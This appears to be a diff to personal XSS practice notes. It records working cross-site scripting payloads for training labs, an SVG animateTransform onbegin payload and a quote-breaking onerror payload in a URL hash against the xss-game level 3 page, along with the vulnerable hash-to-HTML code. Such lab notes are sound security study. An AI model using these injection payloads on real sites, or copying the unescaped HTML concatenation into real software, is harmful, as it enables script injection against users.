@@ -631,3 +631,23 @@ GET /?search=<svg><animateTransform%20§=1§> HTTP/1.1
 (onbegin event handler is allowed.)
 
 final payload --> <svg><animateTransform onbegin=alert(1)></svg>
+___________________________________________________________________________________________________________________________________________________________________
+add (') and add event handler
+-----------------------------
+
+      function chooseTab(num) {
+        // Dynamically load the appropriate image.
+        var html = "Image " + parseInt(num) + "<br>";
+        html += "<img src='/static/level3/cloud" + num + ".jpg' />";
+        $('#tabContent').html(html);
+
+        window.location.hash = num;
+
+
+https://xss-game.appspot.com/level3/frame#2 (normal url)
+
+
+html += "<img src='/static/level3/cloud" + num + ".jpg' />";
+
+if you add (') and add onerror event handler, it will work
+https://xss-game.appspot.com/level3/frame#' onerror="alert(document.domain)"
